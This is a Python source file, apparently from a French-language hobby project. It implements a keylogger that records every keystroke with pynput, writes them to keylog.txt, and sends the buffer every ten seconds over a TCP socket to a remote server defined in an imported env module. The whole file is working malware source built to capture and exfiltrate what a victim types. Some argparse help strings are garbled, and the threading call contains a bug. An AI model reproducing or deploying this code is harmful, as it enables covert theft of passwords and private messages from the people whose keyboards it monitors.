from env import *

import argparse
import socket
import time
import threading
from pynput.keyboard import Key, Listener

def argument():
    p = argparse.ArgumentParser(description='Ajouter description')
    p.add_argument('-p', '--ping', action='store_true', help='Faffs UP')
    p.add_argument('-s', '--socket',type=all, help="ffffles 100 premiers ports")
    p.add_argument('-o', action='store_true', help='Enregifer')
    args = p.parse_args()
    return args



TXT_GLOB = ""


def kill_all() :
    print( "tout tuer ")

def parse(str):
    new_str = str.replace("'", "")
    new_str = new_str.replace("Key.space"," ")
    new_str = new_str.replace("Key.backspace","<-")
    new_str = new_str.replace("Key.enter","\n")
    return new_str

def kpr(key):
        global TXT_GLOB
        with open("keylog.txt", "a") as f:
            f.write(parse(str(key)))
            TXT_GLOB += parse(str(key))



def chrono():
    global TXT_GLOB
    while True:
        seconds = 0
        while True:
            print(f"Secondes : {seconds}")
            seconds += 1
            time.sleep(1)
            if seconds % 10 == 0 :
                send_t = threading.Thread(target=send(TXT_GLOB))
                send_t.start()
                #print(TXT_GLOB)
                TXT_GLOB = ""
            if seconds == 600 :
                return 0

def keylogger():
    with Listener(on_press=kpr) as listener:
        listener.join()


def send(data):
    try :
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        client_socket.connect((SRV, PORT))

        client_socket.send(data.encode('utf-8')) ##envoi

        client_socket.close()
    except :
        kill_all()

    #print(data)


def commands(cmd):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect((SRV, PORT))

    client_socket.send(cmd.encode('utf-8'))  ##envoi

    client_socket.close()



chrono_t = threading.Thread(target=chrono)

chrono_t.start()


keylog_t = threading.Thread(target=keylogger)

keylog_t.start()










